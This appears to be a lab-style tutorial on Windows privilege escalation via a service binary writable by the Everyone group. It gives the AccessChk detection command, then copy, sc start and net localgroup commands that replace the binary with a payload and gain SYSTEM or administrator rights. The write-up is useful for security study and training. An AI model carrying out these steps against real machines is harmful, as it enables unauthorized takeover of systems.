
---
### 🛡️ **Detection (Finding the Vulnerability)**

You're using **AccessChk**, a Sysinternals tool, to check who has access to a file:

```cmd
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```

This command checks permissions on files in that folder.

- **Key finding:** The `Everyone` group has `FILE_ALL_ACCESS` on `filepermservice.exe`.
    
- This means **any user** (even low-privileged ones) can **overwrite or modify** the service binary.
    

---

### 💥 **Exploitation (Gaining Admin Access)**

#### Step 1: Overwrite the service executable

You replace the vulnerable executable with your **malicious payload** (e.g., a reverse shell or user-adder script):

```cmd
copy /y c:\Temp\x.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```

> `x.exe` should be a custom executable that, for example, **adds your user to the Administrators group**.

#### Step 2: Trigger the service

You start the service, which runs your payload **with SYSTEM privileges**:

```cmd
sc start filepermsvc
```

> Since services often run as SYSTEM, your payload does too.

#### Step 3: Confirm success

Check if your user is now an administrator:

```cmd
net localgroup administrators
```

---

### 🔒 Why This Works

- **Misconfigured permissions** let unprivileged users **overwrite system-level binaries**.
    
- When the service runs, **your code executes with SYSTEM privileges**.
    

---

